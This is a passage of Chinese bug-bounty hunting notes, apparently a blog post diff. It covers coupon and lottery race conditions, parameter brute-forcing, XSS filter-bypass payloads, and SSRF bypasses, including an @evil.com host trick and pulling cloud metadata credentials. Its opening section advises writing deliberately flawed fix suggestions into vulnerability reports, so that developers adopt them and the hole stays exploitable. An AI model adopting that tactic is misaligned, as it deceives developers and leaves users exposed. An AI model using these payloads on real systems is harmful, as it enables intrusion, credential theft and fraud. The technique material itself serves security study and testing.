+<p>如果发现漏洞后提交，最后要写一个<strong>带有坑</strong>的修复建议——开发人员可能就考虑采取我所提出的修复方案，这样就可以再次挖掘。这背后是一个很实际的策略：如果你不提供修复方案，开发可能修得很彻底；如果你提供了一个”看似合理但不够全面”的修复方案，开发大概率就直接采用，从而留下后续挖掘的空间。</p>
+<blockquote>
+<p><strong>再深一层——为什么这个策略有效？</strong> 因为开发者面对漏洞报告时的心理是”尽快关掉这个 issue”。你给了他一个现成的修复建议，他不用自己思考，直接复制粘贴到代码里就完事了——省心。而安全团队的审核者看到”提交者给出了修复建议”，会认为这是一个高质量的提交，更容易通过。你的”带坑修复方案”实际上是一个<strong>锚定效应</strong>的应用——你锚定了一个看起来合理的修复方向，把开发者的思维框在那个方向里，他就不会去思考”这个方案之外还有没有更彻底的修法”。</p>
+</blockquote>
+<hr>
+<h2 id="2-4-JS-突破-sign-定位"><a href="#2-4-JS-突破-sign-定位" class="headerlink" title="2.4 JS 突破 sign 定位"></a>2.4 JS 突破 sign 定位</h2><p>通过开发工具的”网络”选项卡去找到 sign 的加密算法，然后使用 WASM 反编译并进行栈追踪。这个要学习 JS 逆向。</p>
+<p><strong>为什么 focus 在 sign？</strong> 因为 sign&#x2F;signature 是现代 Web 应用最常见的反篡改手段——前端对请求参数做签名，后端验证签名。如果你不能逆向出签名算法，你就无法伪造合法请求。而 WASM 反编译之所以重要，是因为越来越多的应用把加密逻辑编译成 WASM，而不是直接暴露在 JS 源码中——这是一种对抗逆向的手段。</p>
+<blockquote>
+<p><strong>逻辑链</strong>：请求被 sign 保护 → 找不到 sign 算法就无法改参数 → 在 Network 面板定位发起 sign 计算的 JS 文件 → 如果是 WASM 则反编译 → 栈追踪定位签名函数 → 复现签名算法 → 自由构造请求。</p>
+</blockquote>
+<p>（有待补充）</p>
+<hr>
+<h2 id="2-5-参数爆破"><a href="#2-5-参数爆破" class="headerlink" title="2.5 参数爆破"></a>2.5 参数爆破</h2><h3 id="2-5-1-JSON-中的键名与值——猜测它的用途"><a href="#2-5-1-JSON-中的键名与值——猜测它的用途" class="headerlink" title="2.5.1 JSON 中的键名与值——猜测它的用途"></a>2.5.1 JSON 中的键名与值——猜测它的用途</h3><p>对于一个数据包中含有一些 JSON 数据，要关注 JSON 数据中的键名与值，猜测其用途。比如 <code>&quot;funname&quot;:&quot;12783718&quot;</code>，是不是可以猜想到每一个 fun 对应一个 id 又去对应一个功能点？</p>
+<blockquote>
+<p><strong>推理深挖</strong>：<strong>参数名本身就透露了它的语义</strong>。<code>funname</code> 这种命名暗示它可能是一个功能的标识符，而 <code>12783718</code> 这种纯数字值暗示它可能是自增 ID 或者可枚举的编号。如果是自增 ID，那就可以遍历；如果是可枚举编号，那就可以爆破。</p>
+<p>开发者给参数起名的时候不会想到安全——他们只是想表达这个参数是干什么的。但对于攻击者来说，<strong>参数名就是最好的攻击线索</strong>。<code>isAdmin</code>、<code>role</code>、<code>permission</code>、<code>userId</code>——这些名字直接把攻击方向告诉了你。</p>
+</blockquote>
+<p>这样就可以尝试对这个值进行爆破，然后观察返回包看看有什么新奇的东西。根据回显然后增加参数、删除参数等就可以发散思维去做了。</p>
+<h3 id="2-5-2-签到送优惠券、新用户、开宝箱"><a href="#2-5-2-签到送优惠券、新用户、开宝箱" class="headerlink" title="2.5.2 签到送优惠券、新用户、开宝箱"></a>2.5.2 签到送优惠券、新用户、开宝箱</h3><p>看见这些场景，思路是：</p>
+<p><strong>第一步：万物并发法</strong>——直接对签到按钮进行并发。为什么并发能生效？因为后端可能没有加分布式锁（Redis 锁、数据库行锁），多个请求同时到达时都通过了”是否已领取”的检查，然后都执行了发放操作。这是典型的<strong>竞态条件（Race Condition）</strong>。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：并发能成功的根本原因是<strong>检查-操作（check-then-act）的非原子性</strong>。后端代码大概率是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (用户尚未领取) &#123;    // ← 多个并发请求同时通过这个检查</span><br><span class="line">    发放优惠券();       // ← 每个请求都执行了发放</span><br><span class="line">    标记已领取();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>请求 A 通过检查，还没来得及标记”已领取”，请求 B 也通过了检查——两个请求都进入了发放逻辑。</p>
+</blockquote>
+<p><strong>第二步：修改数据包有关获奖的参数</strong>，看看能不能直接获大奖。这里的逻辑是：奖品类型可能是由前端传参决定的（比如 <code>prize_level=1</code>），后端没有校验这个参数是否在用户实际应该获得的范围内。</p>
+<p><strong>第三步：对于优惠券如果加锁了（即领取之后就锁住了不能并发）</strong>：</p>
+<ul>
+<li><strong>尝试 1</strong>：请求包与响应包里那个可能决定了优惠券已被领取的参数，把它删除或置空或改为其他值，能否绕过？为什么要同时看请求包和响应包？因为判断”已领取”的依据可能来自请求参数（前端传的状态）也可能来自响应参数（服务端返回的状态）。如果服务端信任了请求中的状态标记，那改请求就能绕过；如果服务端在响应中标记了状态，那你就知道服务端在追踪什么字段。</li>
+<li><strong>尝试 2</strong>：爆破一些参数，看看是不是存在一些隐藏低门槛的优惠券。为什么会有隐藏优惠券？运营活动经常配置多档优惠券（满 100-10、满 200-50 等），有些券没有在前端展示但优惠券 ID 是连续的——爆破券 ID 就可能领到未公开的高额券。</li>
+<li><strong>尝试 3</strong>：删除参数或置空。</li>
+<li><strong>尝试 4</strong>：能不能重复使用优惠券？或者延伸知识点——有多张相同的优惠券，能否同时在同一个商品使用？这里面涉及的是<strong>业务规则的校验缺失</strong>——优惠券系统可能只校验了”券是否存在”和”是否过期”，但没校验”是否已使用”或者”同一订单是否允许多张同类型券”。</li>
+</ul>
+<h3 id="2-5-3-抽奖模式——重发包"><a href="#2-5-3-抽奖模式——重发包" class="headerlink" title="2.5.3 抽奖模式——重发包"></a>2.5.3 抽奖模式——重发包</h3><p>对于一些抽奖模式（你获得了一个金币），一般回包是有 <code>&quot;msg&quot;:&quot;success&quot;</code>。这时候去开发者工具的网络中查找流量，然后找到相关的接口（实际上看 Burp Suite 的历史记录也是可以的）。</p>
+<p>大多数人就是找有没有控制数量的相关字段，通过修改数量实现获取更多的金币，而忽略还有一种尝试就是<strong>重发</strong>这个包。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么重发可能有效？因为抽奖接口可能是一个<strong>非幂等的操作</strong>——每次请求都会触发一次抽奖逻辑。如果服务端没有对单次抽奖结果做去重（没有记录”该用户本次抽奖已完成”的状态），那重发这个包就会再次触发抽奖。这比修改数量参数更隐蔽，因为请求本身完全合法——你只是多发了它几次。</p>
+<p><strong>对比</strong>：修改数量 → 请求看起来”异常”（数量从 1 变成 100），可能触发风控。重发包 → 每个请求都是”正常”的（每次请求都是合法的 1 次），但总效果是多次抽奖。</p>
+</blockquote>
+<hr>
+<h1 id="三、OWASP-TOP-10"><a href="#三、OWASP-TOP-10" class="headerlink" title="三、OWASP TOP 10"></a>三、OWASP TOP 10</h1><h2 id="3-1-XSS"><a href="#3-1-XSS" class="headerlink" title="3.1 XSS"></a>3.1 XSS</h2><h3 id="3-1-1-富文本编辑器——重灾区"><a href="#3-1-1-富文本编辑器——重灾区" class="headerlink" title="3.1.1 富文本编辑器——重灾区"></a>3.1.1 富文本编辑器——重灾区</h3><p>富文本编辑区一直都是 XSS 漏洞的重灾区，因为富文本必然是要去执行 HTML 代码——这是它的核心功能，不可能完全剥离。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：富文本的本质矛盾——它必须允许用户输入 HTML（否则无法实现加粗、变色、插入链接等功能），但允许 HTML 就意味着打开了 XSS 的大门。安全团队只能在”允许哪些 HTML”上做文章，而这就产生了过滤器和浏览器的解析差异——即绕过空间。</p>
+</blockquote>
+<p>现在的很多富文本编辑器对”事件”（onclick、onerror 等）有很严格的过滤。为什么对事件过滤严而对标签过滤松？因为编辑器必须允许用户使用 <code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code> 等标签来实现富文本功能，但事件属性属于”附加行为”而非”内容展示”，所以优先过滤事件。</p>
+<p>很多时候要尝试使用 JS 的<strong>伪协议</strong>（一些编码绕过也是可以研究一下的），而标签很多使用 <code>a</code>、<code>iframe</code>。伪协议（如 <code>javascript:</code>、<code>data:text/html</code>）之所以是绕过方向，因为很多过滤器的正则只检查了 HTML 标签和事件，但没有覆盖 URL 协议层面的注入。</p>
+<blockquote>
+<p><strong>绕过优先级排序</strong>：</p>
+<ol>
+<li>纯 HTML 标签嵌入 → 测试过滤器的标签白名单</li>
+<li>事件属性（onerror&#x2F;onload）→ 测试事件黑名单</li>
+<li>伪协议（javascript:&#x2F;data:）→ 测试 URL 协议过滤</li>
+<li>编码绕过（HTML实体&#x2F;URL编码&#x2F;Unicode）→ 测试解码顺序差异</li>
+</ol>
+</blockquote>
+<p>一些 XSS 漏洞基础可以回看之前的文章。</p>
+<h3 id="3-1-2-见框就试，触发点可能在意想不到的地方"><a href="#3-1-2-见框就试，触发点可能在意想不到的地方" class="headerlink" title="3.1.2 见框就试，触发点可能在意想不到的地方"></a>3.1.2 见框就试，触发点可能在意想不到的地方</h3><p>养成一个思维——<strong>见框框就尝试 XSS</strong>。比如你在个人中心的某个框框输入了 XSS 的 payload，没有触发。但是回到主页面之后，就触发了（调用了个人中心的一些信息）。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个现象说明 XSS 的<strong>触发点</strong>和<strong>注入点</strong>是分离的。你在 A 页面输入的 payload，可能在 B 页面被渲染执行。所以不能因为当前页面没弹窗就认为不存在 XSS——你要跟踪你的输入在整个应用中的流向。</p>
+<p><strong>逻辑链</strong>：数据存储（数据库）→ 数据读取（后端返回）→ 数据渲染（前端展示），这三个环节任何一个缺乏过滤都可能导致 XSS。你可能在”个人中心”注入，”首页”触发，”文章详情页”执行——所以发散思维去覆盖所有可能的展示场景。</p>
+<p><strong>再深一层——怎么系统性覆盖所有展示场景，而不是靠运气？</strong> 一个实操方法是：注入 payload 之后，把这个应用你能点开的所有页面都点一遍。主页、个人页、设置页、搜索页、列表页、详情页——每一个都看一遍。然后在开发者工具的 Network 面板里搜你的 payload 关键词，看它在哪些接口的响应里出现了——<strong>哪个接口返回了你的 payload，哪个接口对应的页面就是潜在触发点</strong>。这比一个个页面肉眼找快得多，也不容易遗漏。</p>
+</blockquote>
+<p>构造 JS 的 payload 时，要注意 HTML 与 script 这些是并发执行的，setTimeout 函数是必要的，还有有时候 GET 不行改为 POST 就行。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;qq&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;=&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// 一些奇怪的 payload</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1-3-从原理到实践——XSS-容易出现的功能点"><a href="#3-1-3-从原理到实践——XSS-容易出现的功能点" class="headerlink" title="3.1.3 从原理到实践——XSS 容易出现的功能点"></a>3.1.3 从原理到实践——XSS 容易出现的功能点</h3><p>要有效地挖掘 Top 10 漏洞，必须对这些漏洞的原理有透彻的理解。就我个人而言，在学习这些内容时，我喜欢从宏观到微观逐步深入。以 XSS 漏洞为例，我会首先大致了解浏览器的工作原理，然后研究浏览器的渲染过程。在掌握了这些基础知识之后，我再去总结 XSS 漏洞容易出现的功能点。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么这个顺序重要？因为如果你不理解浏览器的解析过程（HTML 解析 → CSS 解析 → JS 执行），你就无法理解为什么某些 payload 能绕过、某些不能。比如为什么 <code>&lt;&lt;a&gt;img\src\onerror=alert(1)&gt;1</code> 这种畸形标签可能生效？因为浏览器的容错解析机制会把不符合规范的 HTML 尽力修复成可渲染的 DOM 树——你利用的就是浏览器”纠错”过程中的边界情况。</p>
+</blockquote>
+<p><strong>XSS 漏洞容易出现的功能点</strong>：</p>
+<ul>
+<li><strong>用户输入保存功能</strong>：如评论区、论坛帖子、用户配置文件和消息系统。当用户输入的数据未经充分清理或转义就被存储到服务器中，然后再展示给其他用户时，就可能触发 XSS 攻击。</li>
+<li><strong>数据库内容</strong>：存储型 XSS 攻击常通过将恶意脚本注入数据库来实现。这些脚本随后从数据库读取并展示给用户，例如在动态网页内容、用户生成的内容或其他可存储数据的地方。</li>
+<li><strong>电子邮件和通讯应用</strong>：如果一个应用允许用户发送包含 HTML 或 JavaScript 内容的信息，并且这些内容被存储并在其他用户的浏览器中原样渲染，那么就可能存在存储型 XSS 的风险。</li>
+<li><strong>日志文件</strong>：在一些情况下，恶意脚本可能被注入到日志文件中，然后通过查看这些日志文件的界面被触发。这种情况往往被忽略——开发者没想到日志查看系统会把日志内容当作 HTML 来渲染。</li>
+<li><strong>文件上传功能</strong>：如果应用允许用户上传包含可执行脚本的文件，并且这些文件能够在其他用户的浏览器中被执行，这也可能成为存储型 XSS 的一个矢量。</li>
+</ul>
+<blockquote>
+<p><strong>评论区！评论区！框框！框框！——高发区域</strong></p>
+</blockquote>
+<h3 id="3-1-4-测试技巧——先插无害标签，再逐步加码"><a href="#3-1-4-测试技巧——先插无害标签，再逐步加码" class="headerlink" title="3.1.4 测试技巧——先插无害标签，再逐步加码"></a>3.1.4 测试技巧——先插无害标签，再逐步加码</h3><p>在挖掘的过程中，不要一上来就插入一些有危害的 XSS payload，可以先插入一些无危害的标签如：<code>&lt;h1&gt;&lt;/h1&gt;</code>、<code>&lt;u&gt;&lt;/u&gt;</code>。</p>
+<p><strong>为什么要这样做？</strong> 有两个原因：</p>
+<ol>
+<li>无害标签可以帮你判断<strong>输入是否被原样输出</strong>——如果 <code>&lt;h1&gt;test&lt;/h1&gt;</code> 被渲染成了大标题，说明 HTML 标签没有被转义，XSS 的大门是敞开的。</li>
+<li>直接上 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 可能触发 WAF 或者被加入黑名单，导致后续测试被阻断。先用无害标签探测过滤器行为，再根据过滤规则构造绕过 payload——这是一种更隐蔽、更可持续的测试策略。</li>
+</ol>
+<blockquote>
+<p><strong>推理深挖</strong>：这个策略的核心是<strong>信息收集优先于攻击</strong>。在不知道过滤器规则的情况下直接怼 payload，就像在黑暗中乱开枪——你不知道是被拦截了还是 payload 本身不对。先用无害标签探路，相当于先点亮地图：标签被原样输出 → 无过滤；标签被转义 → 有 HTML 实体编码；标签被删除 → 有标签黑名单；只有标签名被保留 → 只允许白名单标签。</p>
+<p><strong>再深一层——这个”渐进式测试”策略不只是技巧，而是一套完整的过滤器逆向方法论</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一轮：&lt;h1&gt;test&lt;/h1&gt;         → 测标签是否被原样保留</span><br><span class="line">第二轮：&lt;img src=x&gt;           → 测自闭合标签是否被过滤  </span><br><span class="line">第三轮：&lt;a href=&quot;http://x&quot;&gt;   → 测属性值是否被保留</span><br><span class="line">第四轮：&lt;a href=&quot;javascript:&quot;&gt; → 测伪协议是否被过滤</span><br><span class="line">第五轮：&lt;img src=x onerror=&gt;   → 测事件是否被过滤</span><br></pre></td></tr></table></figure>
+<p>每一轮只需要改一个变量，观察结果变化，你就能精确反推出过滤器的规则表。这不是在”试”，这是在<strong>逆向工程</strong>——把过滤器当成一个黑盒函数，通过输入输出反推它的内部逻辑。逆出来之后，绕过就是填空游戏了。</p>
+</blockquote>
+<p>如果发现 <code>&gt;</code> 被实例化转义之后就要放弃了吗？其实单个标签的 <code>&gt;</code> 被过滤，但有可能多个标签的组合就不会过滤。为什么会这样？因为很多过滤器的实现是<strong>基于正则的</strong>，而正则表达式在解析嵌套结构时存在天然盲区。比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">a</span>&gt;</span>img\src\onerror=alert(1)&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>这个 payload 利用了浏览器 HTML 解析器和正则过滤器的<strong>解析差异</strong>——正则可能没匹配到这种畸形结构，但浏览器的容错解析器却能把它还原成一个可执行的 DOM 元素。</p>
+<p>可能又会发现空格被过滤，又可以去思考什么可以替代空格（<code>/**/</code> 或 <code>\</code> 等等），可以 AI 去查询。空格被过滤是常见的防御措施（因为很多 payload 需要空格来分隔标签名和属性），但 HTML 规范中标签名和属性之间的分隔符有很多替代方案。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：过滤器的设计者通常按照”正常 HTML”的语法来写规则（<code>&lt;tagname attribute=value&gt;</code>），但浏览器解析 HTML 时遵循的是<strong>容错解析算法</strong>——它会尝试修复任何看起来像 HTML 的东西，即使语法不标准。这个”修复能力”的范围远大于过滤器的”识别能力”的范围——这就是绕过的根本空间。</p>
+</blockquote>
+<p>到这里，应该是可以嵌入完整的标签了，90% 存在 XSS，因为还需考虑事件的过滤。事件的过滤比标签过滤更棘手——你可以不用 <code>&lt;script&gt;</code> 标签，但你需要一个事件来触发 JS 执行（<code>onerror</code>、<code>onload</code>、<code>onfocus</code> 等）。如果事件被全面过滤，即使能嵌入完整的 HTML 标签，也可能无法执行 JS——这时需要考虑不需要事件的攻击向量，比如 CSS 注入、HTML 注入导致钓鱼页面等。</p>
+<p>属于 Top 10 的漏洞，审核者不会对危害有过多的拉扯。</p>
+<h3 id="3-1-5-输入完全被转义了怎么办？试试其他端"><a href="#3-1-5-输入完全被转义了怎么办？试试其他端" class="headerlink" title="3.1.5 输入完全被转义了怎么办？试试其他端"></a>3.1.5 输入完全被转义了怎么办？试试其他端</h3><p>如果输入什么都被实例化转义（70%~80% 要放弃了），但是还可以提供一个思路——网站无法 XSS，是否有其他子站点？小程序？APP？</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么跨端可能有效？因为同一个公司的不同产品端可能由不同团队开发，使用了不同的过滤器甚至不同的渲染引擎。Web 端可能用了严格的 DOMPurify + CSP，但 APP 端的 WebView 可能直接 <code>innerHTML</code> 渲染。或者小程序端可能没有使用 Web 端共享的过滤组件。</p>
+<p><strong>逻辑链</strong>：Web 端过滤严格 → 尝试 APP 端注入（同一数据存储，不同过滤） → APP 注入成功 → 数据存入数据库 → Web 端读取并渲染 → XSS 触发。本质上是<strong>利用不同端过滤器的不一致性，找到整个数据链路中最薄弱的注入点</strong>。</p>
+</blockquote>
+<p>比如在网站无法 XSS，但是使用 APP 就可以注入 XSS payload，然后用网页版打开就可以被成功执行。</p>
+<h3 id="3-1-6-一个奇特的-APP-场景——拍照识别文字"><a href="#3-1-6-一个奇特的-APP-场景——拍照识别文字" class="headerlink" title="3.1.6 一个奇特的 APP 场景——拍照识别文字"></a>3.1.6 一个奇特的 APP 场景——拍照识别文字</h3><p>APP 页面没有框框，然后发现一个”相机”功能，点击相机，然后发现有拍照识别文字的功能。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个场景的特殊性在于——输入不是通过传统的键盘&#x2F;表单，而是通过 OCR 识别的结果。开发者可能想到了对文本框输入做过滤，但<strong>完全没想到 OCR 识别的文字也会成为攻击向量</strong>。这是一种典型的”非传统输入源”盲区。</p>
+</blockquote>
+<p>流程：</p>
+<ol>
+<li>正常走一下流程，比如拍摄 <code>12345</code>，然后会在一个框框中展示识别的结果。</li>
+<li>那就可以测试拍照识别 XSS 的 payload，若没有过滤的话，最后也是可以成功执行。你拍的不是 <code>12345</code>，而是一张写有 <code>&lt;img src=x onerror=alert(1)&gt;</code> 的纸——OCR 识别出这段文字，填入展示框，如果没过滤就触发了。</li>
+<li>如果前面都执行顺利，那就要思考怎么扩大影响了——<strong>将反射型 XSS 转为存储型 XSS</strong>。比如可能存在的”分享功能”，将这个东西分享到社区的论坛什么的，别人一查看就可以执行 XSS。</li>
+</ol>
+<blockquote>
+<p><strong>逻辑链</strong>：OCR 拍照输入（非传统输入源，无过滤）→ 识别结果存入 → 分享功能传播 → 其他用户查看 → 存储型 XSS。每一步都在扩大攻击面：<strong>单个用户触发 → 能否让其他用户也触发 → 从反射型升级到存储型</strong>。</p>
+</blockquote>
+<hr>
+<h2 id="3-2-CORS"><a href="#3-2-CORS" class="headerlink" title="3.2 CORS"></a>3.2 CORS</h2><ul>
+<li>相关漏洞的利用看回笔记。</li>
+<li>特别注意的一个点：Origin 的 URL 地址是不可以带端口的，且域名只可以绑定到 IP 上。这个限制是浏览器的安全策略——如果 Origin 可以带任意端口，那同域名不同端口的服务就可以互相跨域访问，这打破了同源策略的端口隔离假设。</li>
+</ul>
+<hr>
+<h2 id="3-3-SSRF"><a href="#3-3-SSRF" class="headerlink" title="3.3 SSRF"></a>3.3 SSRF</h2><p>C 段、B 段、A 段，直接请求本地就行了。这句话说的是内网探测的递进策略——先从本机（127.0.0.1）开始，再扩展到同 C 段（255 个 IP）、同 B 段（65535 个 IP），逐级扫描内网资产。</p>
+<p><strong>SSRF（Server-Side Request Forgery，服务器端请求伪造）</strong> 是一种网络安全漏洞，它使攻击者能够迫使服务器端的应用程序对攻击者控制的外部服务器进行 HTTP 请求。这种漏洞可以用来绕过防火墙，访问内网服务，进行端口扫描，甚至在某些情况下执行远程代码。</p>
+<p><strong>关于回显</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>回显类型</th>
+<th>特征</th>
+<th>利用难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>全回显</strong></td>
+<td>服务器把完整响应（响应头 + 响应体）都返回给你</td>
+<td>低——几乎等同于全功能内网代理</td>
+</tr>
+<tr>
+<td><strong>半回显</strong></td>
+<td>只能看到部分响应，比如仅状态码或某些响应头</td>
+<td>中——可通过状态码判断端口开放，或通过响应时间判断服务存在</td>
+</tr>
+<tr>
+<td><strong>无回显</strong></td>
+<td>完全看不到任何响应</td>
+<td>高——需要通过 DNS 外带、延迟判断等旁路手段获取信息</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>推理深挖</strong>：无回显不代表完全无法利用。即使看不到响应体，你依然可以通过以下方式获取信息：</p>
+<ul>
+<li>DNS 外带：让目标请求一个你控制的域名，通过 DNS 日志确认请求是否发出</li>
+<li>时间延迟：内网端口开放时响应快，端口关闭时超时慢 → 时间差探测端口</li>
+<li>错误消息差异：不同内网服务返回不同的错误信息</li>
+</ul>
+</blockquote>
+<h3 id="3-3-1-场景一：支付功能点里藏着-SSRF"><a href="#3-3-1-场景一：支付功能点里藏着-SSRF" class="headerlink" title="3.3.1 场景一：支付功能点里藏着 SSRF"></a>3.3.1 场景一：支付功能点里藏着 SSRF</h3><p>一些余额充值的功能点（微信、支付宝的 SDK…），很多师傅都不会想象这里会有什么 SSRF 漏洞点。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么大多数人会忽略这里？因为支付功能给人的感觉是”跟钱打交道，安全性肯定最高”。但这是一个危险的预设——实际上，一旦涉及第三方 SDK 回调、服务端主动请求外部 URL 等逻辑，SSRF 的风险就存在了。<strong>安全性的高低不取决于”功能是否重要”，而取决于”代码是否处理了外部 URL”</strong>。</p>
+</blockquote>
+<p>实际上在挖掘 SRC 的过程中，<strong>每一个功能点都要抓取数据包</strong>。这个原则的本质是：<strong>不要预判哪里安全、哪里不安全</strong>——你预判安全的地方，往往就是你的盲区。</p>
+<p>一般这种请求包（支付功能几乎都是 POST 请求）的参数很多，响应包的参数也很多，而且还会编码或加密。所以能将参数解码的解码（解密的很难，也不太考虑）。为什么要区分解码和解密？因为 Base64 编码、URL 编码这些是可逆的编码——拿到就能还原；而 AES&#x2F;DES 加密需要密钥，没有密钥几乎不可能还原。所以优先处理编码，加密的先放一边。</p>
+<p>在这个场景中，解码之后的参数发现了一个固定的链接段（路径请求），猜测这与 POST 数据包的各部分相关参数进行拼接然后请求服务器。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的推理链条是：参数中出现了 URL 片段 → 后端可能在做 URL 拼接 → 如果你的输入会影响拼接结果 → 就可能控制请求的目标。这是一种”从参数语义反推断后端逻辑”的方法——你看到什么参数，就推测后端拿它做什么。</p>
+</blockquote>
+<p>所以现在就要思考能不能进行一些操作实现绕过，然后去请求我们希望请求的服务器（即 SSRF）。又回到了熟悉的 URL 绕过——<code>@</code>、编码等。发现给定了路径，尝试使用 <code>@domain/path</code> 进行 SSRF。这是利用了 URL 解析中 <code>@</code> 符号的特性：<code>http://expected.com@evil.com/path</code> → 实际请求到的是 <code>evil.com</code>，因为 <code>@</code> 前面被解析为认证信息而非主机名。</p>
+<p>同时数据包中，<code>sc</code> 为签名，和输入数据有关。利用 Xposed（属于安卓逆向）的算法助手插件，去分析其签名算法，然后使用 Python 写出 PoC。这里为什么需要逆向？因为你改了 URL，签名就对不上了——服务端会校验签名。所以要先把签名算法逆向出来，才能自己算签名。</p>
+<blockquote>
+<p><strong>逻辑链</strong>：发现 URL 参数 → URL 绕过（@ 符号）绕主机名限制 → 但签名校验失败 → Xposed 逆向签名算法 → Python 重算签名 → 完整 SSRF 利用。</p>
+</blockquote>
+<p><strong>云服务器就要想到云数据元数据接口</strong>：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/213/4934">https://cloud.tencent.com/document/product/213/4934</a></p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么云服务器和元数据接口是 SSRF 的关键目标？因为云平台（AWS、阿里云、腾讯云等）都在实例内部提供了一个固定的元数据服务地址（如 <code>169.254.169.254</code>），这个地址不需要认证就能访问，会返回实例的敏感信息。一旦你有 SSRF，请求到这个地址就能直接获取云服务器的凭证。<strong>这是一个”只要 SSRF 能打内网就一定有收获”的固定目标。</strong></p>
+</blockquote>
+<p>可以泄露的信息：</p>
+<ul>
+<li>业务配置信息</li>
+<li>镜像配置信息</li>
+<li>实例信息</li>
+<li>实例用户数据</li>
+</ul>
+<p>甚至在配置了 CAM 的情况下，可以利用 <code>cam/security-credentials/${role-name}</code> 接口拿到访问凭证对机器进行接管。在这个机器中，<code>cam/security-credentials/</code> 下仅有一个默认的 <code>TKE_QCSLinkedRoleInEKSLog</code> 用户，但是以后若是业务配置了 CAM，便存在 getshell 的风险。</p>
+<h3 id="3-3-2-场景二：意见反馈的截图功能"><a href="#3-3-2-场景二：意见反馈的截图功能" class="headerlink" title="3.3.2 场景二：意见反馈的截图功能"></a>3.3.2 场景二：意见反馈的截图功能</h3><p>一些网站的意见反馈功能具有截图功能，那就要思考截图之后是直接丢给服务器还是上传到云存储桶？</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的第一层思考是判断数据流向——截图后谁在请求 URL？如果是前端截图然后上传，那是前端行为（无 SSRF）。如果是后端收到 URL 后去抓取截图（类似服务端截图服务），那就是 SSRF 的潜在点。<strong>区分的关键在于：发起 HTTP 请求的是浏览器还是服务器？</strong></p>
+</blockquote>
+<p>抓取数据包之后就发现其去请求一个 URL。使用 302 跳转即可成功去访问我们设置的地址，但是访问内外地址也没办法成功，于是尝试并发多次访问。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么并发可能有效？因为安全组件（如 URL 校验）可能在并发场景下有竞态条件——第一个请求触发了校验，但并发的大量请求绕过了校验窗口。这和前面并发 RCE 的思路一脉相承：<strong>并发不是在绕过检测逻辑，而是在绕过检测的时机</strong>。</p>
+</blockquote>
+<h3 id="3-3-3-SSRF-绕过技巧"><a href="#3-3-3-SSRF-绕过技巧" class="headerlink" title="3.3.3 SSRF 绕过技巧"></a>3.3.3 SSRF 绕过技巧</h3><ul>
+<li><strong>使用非标准格式的 URL</strong>：尝试十六进制编码、点解析、短 URL 或间接引用来绕过对 URL 格式的校验。核心理念：<strong>不同的 URL 解析库对同一字符串的解析结果可能不同</strong>——你给的是一个格式，校验库解析成 A，但实际请求库解析成 B。</li>
+<li><strong>利用 DNS 重定向</strong>：通过控制 DNS 解析来重定向到攻击者选择的地址，可能利用子域名或 CNAME 记录实现。本质是<strong>时间差攻击</strong>——校验时 DNS 解析到合法地址，请求时 DNS 已经切换到了恶意地址。</li>
+<li><strong>使用预留的 IP 地址</strong>：利用本地或特殊用途的 IP 地址（如 <code>127.0.0.1</code>、<code>0.0.0.0</code>、<code>169.254.169.254</code>）来访问本地或云服务。</li>
+<li><strong>利用 URL 解析差异</strong>：不同的服务器和库对 URL 的解析可能存在差异，攻击者可能利用这些差异来绕过安全检查。</li>
+<li><strong>构造二次注入攻击</strong>：在 SSRF 攻击中植入额外的攻击载荷（如 SQL 注入、XSS 等），尤其是在数据从服务器返回给客户端时。这是一种<strong>漏洞组合</strong>思维——SSRF 不只是 SSRF，它可能成为其他攻击的载体。</li>
+<li><strong>利用 IPv6 地址</strong>：由于一些防护系统主要集中于 IPv4，攻击者可能使用 IPv6 地址来绕过检测。这是<strong>防御不对称</strong>的经典利用——防守方只考虑了 IPv4 的场景，忽略了 IPv6 的攻击面。</li>
+</ul>
+<hr>
